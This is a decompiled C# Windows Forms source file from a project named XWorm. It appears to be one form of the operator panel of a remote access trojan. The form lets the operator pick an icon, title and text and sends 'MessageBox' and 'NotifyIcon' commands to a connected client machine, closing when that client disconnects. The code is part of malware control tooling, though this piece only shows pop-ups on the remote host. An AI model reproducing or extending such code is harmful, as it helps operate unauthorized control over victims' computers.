using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x0200001F RID: 31
	[DesignerGenerated]
	public partial class MBox : Form
	{
		// Token: 0x06000640 RID: 1600 RVA: 0x00038274 File Offset: 0x00036474
		public MBox()
		{
			base.Load += this.MBox_Load;
			base.FormClosing += this.MBox_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x17000250 RID: 592
		// (get) Token: 0x06000643 RID: 1603 RVA: 0x00039F7B File Offset: 0x0003817B
		// (set) Token: 0x06000644 RID: 1604 RVA: 0x00039F85 File Offset: 0x00038185
		internal virtual ImageList ImageList1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000251 RID: 593
		// (get) Token: 0x06000645 RID: 1605 RVA: 0x00039F8E File Offset: 0x0003818E
		// (set) Token: 0x06000646 RID: 1606 RVA: 0x00039F98 File Offset: 0x00038198
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000252 RID: 594
		// (get) Token: 0x06000647 RID: 1607 RVA: 0x00039FDB File Offset: 0x000381DB
		// (set) Token: 0x06000648 RID: 1608 RVA: 0x00039FE5 File Offset: 0x000381E5
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000253 RID: 595
		// (get) Token: 0x06000649 RID: 1609 RVA: 0x00039FEE File Offset: 0x000381EE
		// (set) Token: 0x0600064A RID: 1610 RVA: 0x00039FF8 File Offset: 0x000381F8
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000254 RID: 596
		// (get) Token: 0x0600064B RID: 1611 RVA: 0x0003A001 File Offset: 0x00038201
		// (set) Token: 0x0600064C RID: 1612 RVA: 0x0003A00B File Offset: 0x0003820B
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000255 RID: 597
		// (get) Token: 0x0600064D RID: 1613 RVA: 0x0003A014 File Offset: 0x00038214
		// (set) Token: 0x0600064E RID: 1614 RVA: 0x0003A01E File Offset: 0x0003821E
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000256 RID: 598
		// (get) Token: 0x0600064F RID: 1615 RVA: 0x0003A027 File Offset: 0x00038227
		// (set) Token: 0x06000650 RID: 1616 RVA: 0x0003A031 File Offset: 0x00038231
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000257 RID: 599
		// (get) Token: 0x06000651 RID: 1617 RVA: 0x0003A03A File Offset: 0x0003823A
		// (set) Token: 0x06000652 RID: 1618 RVA: 0x0003A044 File Offset: 0x00038244
		internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000258 RID: 600
		// (get) Token: 0x06000653 RID: 1619 RVA: 0x0003A04D File Offset: 0x0003824D
		// (set) Token: 0x06000654 RID: 1620 RVA: 0x0003A057 File Offset: 0x00038257
		internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000259 RID: 601
		// (get) Token: 0x06000655 RID: 1621 RVA: 0x0003A060 File Offset: 0x00038260
		// (set) Token: 0x06000656 RID: 1622 RVA: 0x0003A06A File Offset: 0x0003826A
		internal virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025A RID: 602
		// (get) Token: 0x06000657 RID: 1623 RVA: 0x0003A073 File Offset: 0x00038273
		// (set) Token: 0x06000658 RID: 1624 RVA: 0x0003A07D File Offset: 0x0003827D
		internal virtual Label Label7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025B RID: 603
		// (get) Token: 0x06000659 RID: 1625 RVA: 0x0003A086 File Offset: 0x00038286
		// (set) Token: 0x0600065A RID: 1626 RVA: 0x0003A090 File Offset: 0x00038290
		internal virtual PictureBox PictureBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025C RID: 604
		// (get) Token: 0x0600065B RID: 1627 RVA: 0x0003A099 File Offset: 0x00038299
		// (set) Token: 0x0600065C RID: 1628 RVA: 0x0003A0A3 File Offset: 0x000382A3
		internal virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025D RID: 605
		// (get) Token: 0x0600065D RID: 1629 RVA: 0x0003A0AC File Offset: 0x000382AC
		// (set) Token: 0x0600065E RID: 1630 RVA: 0x0003A0B6 File Offset: 0x000382B6
		internal virtual Guna2TabControl Guna2TabControl1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025E RID: 606
		// (get) Token: 0x0600065F RID: 1631 RVA: 0x0003A0BF File Offset: 0x000382BF
		// (set) Token: 0x06000660 RID: 1632 RVA: 0x0003A0C9 File Offset: 0x000382C9
		internal virtual TabPage TabPage1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700025F RID: 607
		// (get) Token: 0x06000661 RID: 1633 RVA: 0x0003A0D2 File Offset: 0x000382D2
		// (set) Token: 0x06000662 RID: 1634 RVA: 0x0003A0DC File Offset: 0x000382DC
		internal virtual TabPage TabPage2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000260 RID: 608
		// (get) Token: 0x06000663 RID: 1635 RVA: 0x0003A0E5 File Offset: 0x000382E5
		// (set) Token: 0x06000664 RID: 1636 RVA: 0x0003A0F0 File Offset: 0x000382F0
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x17000261 RID: 609
		// (get) Token: 0x06000665 RID: 1637 RVA: 0x0003A133 File Offset: 0x00038333
		// (set) Token: 0x06000666 RID: 1638 RVA: 0x0003A140 File Offset: 0x00038340
		internal virtual Guna2ComboBox Guna2ComboBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2ComboBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2ComboBox1_SelectedIndexChanged);
				Guna2ComboBox guna2ComboBox = this._Guna2ComboBox1;
				if (guna2ComboBox != null)
				{
					guna2ComboBox.SelectedIndexChanged -= value2;
				}
				this._Guna2ComboBox1 = value;
				guna2ComboBox = this._Guna2ComboBox1;
				if (guna2ComboBox != null)
				{
					guna2ComboBox.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000262 RID: 610
		// (get) Token: 0x06000667 RID: 1639 RVA: 0x0003A183 File Offset: 0x00038383
		// (set) Token: 0x06000668 RID: 1640 RVA: 0x0003A18D File Offset: 0x0003838D
		internal virtual Guna2ComboBox Guna2ComboBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000263 RID: 611
		// (get) Token: 0x06000669 RID: 1641 RVA: 0x0003A196 File Offset: 0x00038396
		// (set) Token: 0x0600066A RID: 1642 RVA: 0x0003A1A0 File Offset: 0x000383A0
		internal virtual Guna2TextBox Guna2TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000264 RID: 612
		// (get) Token: 0x0600066B RID: 1643 RVA: 0x0003A1A9 File Offset: 0x000383A9
		// (set) Token: 0x0600066C RID: 1644 RVA: 0x0003A1B3 File Offset: 0x000383B3
		internal virtual Guna2TextBox Guna2TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000265 RID: 613
		// (get) Token: 0x0600066D RID: 1645 RVA: 0x0003A1BC File Offset: 0x000383BC
		// (set) Token: 0x0600066E RID: 1646 RVA: 0x0003A1C8 File Offset: 0x000383C8
		internal virtual Guna2ComboBox Guna2ComboBox3
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2ComboBox3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2ComboBox3_SelectedIndexChanged);
				Guna2ComboBox guna2ComboBox = this._Guna2ComboBox3;
				if (guna2ComboBox != null)
				{
					guna2ComboBox.SelectedIndexChanged -= value2;
				}
				this._Guna2ComboBox3 = value;
				guna2ComboBox = this._Guna2ComboBox3;
				if (guna2ComboBox != null)
				{
					guna2ComboBox.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000266 RID: 614
		// (get) Token: 0x0600066F RID: 1647 RVA: 0x0003A20B File Offset: 0x0003840B
		// (set) Token: 0x06000670 RID: 1648 RVA: 0x0003A218 File Offset: 0x00038418
		internal virtual Guna2GradientButton Guna2GradientButton2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton2_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton2 = value;
				guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x17000267 RID: 615
		// (get) Token: 0x06000671 RID: 1649 RVA: 0x0003A25B File Offset: 0x0003845B
		// (set) Token: 0x06000672 RID: 1650 RVA: 0x0003A265 File Offset: 0x00038465
		internal virtual Guna2TextBox Guna2TextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000268 RID: 616
		// (get) Token: 0x06000673 RID: 1651 RVA: 0x0003A26E File Offset: 0x0003846E
		// (set) Token: 0x06000674 RID: 1652 RVA: 0x0003A278 File Offset: 0x00038478
		internal virtual Guna2TextBox Guna2TextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x06000675 RID: 1653 RVA: 0x0003A281 File Offset: 0x00038481
		private void MBox_Load(object sender, EventArgs e)
		{
			this.Guna2ComboBox1.SelectedIndex = 0;
			this.Guna2ComboBox2.SelectedIndex = 2;
			this.Guna2ComboBox3.SelectedIndex = 0;
		}

		// Token: 0x06000676 RID: 1654 RVA: 0x0003A2AC File Offset: 0x000384AC
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000677 RID: 1655 RVA: 0x0003A304 File Offset: 0x00038504
		private void MBox_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseMessageBox");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000678 RID: 1656 RVA: 0x0003A344 File Offset: 0x00038544
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"MessageBox",
				SettingsHelper.SPL,
				this.Guna2ComboBox2.Text,
				SettingsHelper.SPL,
				this.Guna2ComboBox1.Text,
				SettingsHelper.SPL,
				this.Guna2TextBox1.Text,
				SettingsHelper.SPL,
				this.Guna2TextBox2.Text
			}));
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000679 RID: 1657 RVA: 0x0003A3EC File Offset: 0x000385EC
		private void Guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2ComboBox1.Text, "None", false) == 0;
			if (flag)
			{
				this.PictureBox1.Image = null;
				this.PictureBox1.Visible = false;
			}
			bool flag2 = Operators.CompareString(this.Guna2ComboBox1.Text, "Information", false) == 0;
			if (flag2)
			{
				this.PictureBox1.Visible = true;
				this.PictureBox1.Image = Resources.Information;
			}
			bool flag3 = Operators.CompareString(this.Guna2ComboBox1.Text, "Question", false) == 0;
			if (flag3)
			{
				this.PictureBox1.Visible = true;
				this.PictureBox1.Image = Resources.Question;
			}
			bool flag4 = Operators.CompareString(this.Guna2ComboBox1.Text, "Warning", false) == 0;
			if (flag4)
			{
				this.PictureBox1.Visible = true;
				this.PictureBox1.Image = Resources.Warning;
			}
			bool flag5 = Operators.CompareString(this.Guna2ComboBox1.Text, "Error", false) == 0;
			if (flag5)
			{
				this.PictureBox1.Visible = true;
				this.PictureBox1.Image = Resources._Error;
			}
		}

		// Token: 0x0600067A RID: 1658 RVA: 0x0003A52C File Offset: 0x0003872C
		private void Guna2ComboBox3_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2ComboBox3.Text, "None", false) == 0;
			if (flag)
			{
				this.PictureBox2.Image = null;
				this.PictureBox2.Visible = false;
			}
			bool flag2 = Operators.CompareString(this.Guna2ComboBox3.Text, "Info", false) == 0;
			if (flag2)
			{
				this.PictureBox2.Visible = true;
				this.PictureBox2.Image = Resources.Information;
			}
			bool flag3 = Operators.CompareString(this.Guna2ComboBox3.Text, "Warning", false) == 0;
			if (flag3)
			{
				this.PictureBox2.Visible = true;
				this.PictureBox2.Image = Resources.Warning;
			}
			bool flag4 = Operators.CompareString(this.Guna2ComboBox3.Text, "Error", false) == 0;
			if (flag4)
			{
				this.PictureBox2.Visible = true;
				this.PictureBox2.Image = Resources._Error;
			}
		}

		// Token: 0x0600067B RID: 1659 RVA: 0x0003A62C File Offset: 0x0003882C
		private void Guna2GradientButton2_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"NotifyIcon",
				SettingsHelper.SPL,
				this.Guna2ComboBox3.Text,
				SettingsHelper.SPL,
				this.Guna2TextBox3.Text,
				SettingsHelper.SPL,
				this.Guna2TextBox4.Text
			}));
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x040002A1 RID: 673
		public Client C;
	}
}
